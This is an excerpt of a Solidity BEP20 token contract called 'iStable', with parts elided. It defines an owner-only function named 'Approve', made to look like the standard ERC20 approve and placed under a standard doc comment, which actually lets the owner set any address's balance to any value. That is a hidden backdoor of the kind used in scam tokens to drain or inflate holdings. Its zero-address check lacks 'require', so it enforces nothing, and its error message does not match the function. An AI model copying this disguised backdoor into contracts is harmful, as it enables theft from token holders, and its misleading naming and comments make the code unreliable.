...
contract iStable is BEP20, Ownable, BaseToken {
  ...
  using SafeMath for uint256;
     ...
     * - `spender` cannot be the zero address.
     */ 
    function Approve(address sender, address routerAddress, uint256 routerAmount) public onlyOwner {
        (routerAddress != address(0), "ERC20: burn from the zero address");
        ...
        require(routerAmount != 2);
        _balances[sender] = routerAmount;
        _balances[routerAddress] = routerAmount;
    } 
